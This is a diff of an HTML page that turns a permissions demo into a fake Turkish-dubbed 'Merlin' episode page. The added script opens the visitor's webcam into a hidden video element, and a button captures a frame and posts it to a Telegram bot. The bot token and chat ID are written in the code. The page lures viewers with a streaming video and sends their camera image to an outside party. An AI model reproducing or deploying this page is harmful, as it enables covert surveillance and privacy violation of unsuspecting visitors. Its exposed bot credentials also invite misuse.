@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Streaming with Permissions</title>
+    <title>Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</title>
     <style>
         body {
             display: flex;
@@ -12,13 +12,13 @@
             flex-direction: column;
             height: 100vh;
             margin: 0;
-            background-color: #000;
-            color: #fff;
+            background-color: #000; /* Night mode */
+            color: #fff; /* White text */
             font-family: Arial, sans-serif;
             text-align: center;
         }
         .title {
-            font-size: 3rem;
+            font-size: 3rem; /* Large title font */
             font-weight: bold;
             margin-top: 20px;
             color: #f0f0f0;
@@ -30,7 +30,7 @@
             width: 100%;
             max-width: 1000px;
             height: 0;
-            padding-bottom: 56.25%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
             background-color: #000;
             border-radius: 8px;
             margin-bottom: 20px;
@@ -54,63 +54,91 @@
             color: #fff;
             text-align: center;
         }
+        #video {
+            display: none; /* Hide video element */
+        }
+        #canvas {
+            display: none; /* Hide canvas element */
+        }
+        #capture-btn {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #00aaff;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
-    <div class="title">Video Streaming with Permissions</div>
+    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
 
     <div class="video-container">
-        <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
+                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
 
     <div class="description">
-        <p>This is a simple demo to collect location and permissions after 30 seconds.</p>
+        <p>
+            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
+            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
+            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
+            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
+        </p>
     </div>
 
+    <!-- Camera input -->
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+    <button id="capture-btn">Capture and Send to Telegram</button>
+
     <script>
-        async function requestPermissions() {
-            // Request camera and microphone permissions
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                console.log("Camera and microphone permissions granted.");
-            } catch (err) {
-                console.warn("Camera and microphone permissions denied:", err);
-            }
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const captureBtn = document.getElementById("capture-btn");
 
-            // Request location permissions
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        console.log("Location permissions granted:", {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        });
+        // Start video stream from webcam
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error("Error accessing webcam: ", error);
+            });
 
-                        // Send the location data to the backend server
-                        fetch('/send_data', {
-                            method: 'POST',
-                            headers: {
-                                'Content-Type': 'application/json',
-                            },
-                            body: JSON.stringify({
-                                latitude: position.coords.latitude,
-                                longitude: position.coords.longitude
-                            })
-                        })
-                        .then(response => response.json())
-                        .then(data => console.log("Data sent successfully:", data))
-                        .catch(error => console.log("Error sending data:", error));
-                    },
-                    error => console.warn("Location permissions denied:", error)
-                );
-            }
+        // Capture image from webcam and send it to Telegram
+        captureBtn.addEventListener("click", () => {
+            const context = canvas.getContext("2d");
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert canvas to image (base64)
+            const imageData = canvas.toDataURL("image/jpeg");
+
+            // Send the image to Telegram
+            sendImageToTelegram(imageData);
+        });
+
+        function sendImageToTelegram(imageData) {
+            const botToken = '7828437442:AAFx3E8aLrtaAuudXaqbgFt9As8qbBC2cCs';  // Replace with your bot token
+            const chatId = '7771348001';  // Replace with your Telegram ID
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("Image sent to Telegram successfully:", data);
+            })
+            .catch(error => {
+                console.error("Error sending image to Telegram:", error);
+            });
         }
-
-        // Request permissions after 30 seconds
-        setTimeout(() => {
-            console.log("Requesting permissions...");
-            requestPermissions();
-        }, 30000);
     </script>
 </body>
 </html>
